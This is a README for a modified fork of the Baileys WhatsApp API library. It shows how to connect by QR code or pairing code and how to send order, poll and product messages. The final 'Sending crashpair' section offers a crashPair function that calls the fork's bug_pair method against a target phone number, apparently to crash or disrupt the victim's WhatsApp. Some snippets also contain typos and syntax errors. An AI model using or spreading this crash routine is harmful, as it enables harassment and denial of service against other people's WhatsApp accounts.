# Modified Whatsapp-API
<p align="center">
  <img src="https://files.catbox.moe/20t9xi.jpg" style="width:100%;">
</p>

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Version](https://img.shields.io/badge/version-1.0.0-blue.svg)]()

--- 

## Usage
```json
"depencies": {
  "@whiskeysockets/baileys": "github:DrayyExposed/Baileys"
}
```
## Import
```javascript
const {
  default:makeWASocket,
  // Other Options 
} = require('@whiskeysockets/baileys');
```

---
# How To Connect To Whatsapp
## With QR Code
```javascript
const {
  default: makeWASocket
} = require('@whiskeysockets/baileys');

const client = makeWASocket({
  browser: ['Ubuntu', 'Chrome', '20.00.1'],
  printQRInTerminal: true
})
```

## Connect With Number
```javascript
const {
  default: makeWASocket,
  fetchLatestWAWebVersion
} = require('@whiskeysockets/baileys');

const client = makeWASocket({
  browser: ['Ubuntu', 'Chrome', '20.00.1'],
  printQRInTerminal: false,
  version: fetchLatestWAWebVersion()
  // Other options
});

const number = "628XXXXX";
const code = await client.requestPairingCode(number.trim) /* Use : (number, "YYYYYYYY") for custom-pairing */

console.log("Ur pairing code : " + code)
```

# Sending messages

## send orderMessage
```javascript
const fs = require('fs');
const DrayyImg = fs.readFileSync('./DrayyImage');

await client.sendMessage(m.chat, {
  thumbnail: DrayyImg,
  message: "erortidakdiketaui",
  orderTitle: "DʀʏᴢxMᴏᴅs",
  totalAmount1000: 72502,
  totalCurrencyCode: "IDR"
}, { quoted:m })
```

## send pollResultSnapshotMessage
```javascript
await client.sendMessage(m.chat, {
  pollResultMessage: {
    name: "DʀʏᴢxMᴏᴅs",
    options: [
      {
        optionName: "poll 1"
      },
      {
        optionName: "poll 2"
      }
    ],
    newsletter: {
      newsletterName: "DʀʏᴢxMᴏᴅs",
      newsletterJid: "1@newsletter"
    }
  }
})
```

## send productMessage
```javascript
await client.relayMessage(m.chat, {
  productMessage {
    title: "erortidakdiketaui",
    description: "zZZ...",
    thumbnail: { url: "./DrayyImage" },
    productId: "EXAMPLE_TOKEN",
    retailerId: "EXAMPLE_RETAILER_ID",
    url: "https://t.me/erortidakdiketaui",
    body: "Nak Tido",
    footer: "Footer",
    buttons: [
      {
        name: "cta_url",
        buttonParamsJson: "{\"display_text\":\"DʀʏᴢxMᴏᴅs\",\"url\":\"https://t.me/erortidakdiketaui\"}"
      }
    ],
    priceAmount1000: 72502,
    currencyCode: "IDR"
  }
})
```

# Sending crashpair

## send crash pairing
```javascript
const { 
  default: makeWaSocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion
} = require("@whiskeysockets/baileys")
const pino = require('pino')

async function crashPair(target) {
  let { state } = await useMultiFileAuthState('./x')
  let { version } = await fetchLatestBaileysVersion()
  let sock = await makeWaSocket({
    auth: state,
    version,
    logger: pino({ level: 'fatal' })
  })

  await sleep(1500)
  await sock.bug_pair(target, "DʀʏᴢxMᴏᴅs")
}
```

### Other Tech Stacks

![My Skills](https://skillicons.dev/icons?perline=9&i=html,css,js)

### Tools

![My Skills](https://skillicons.dev/icons?i=github)
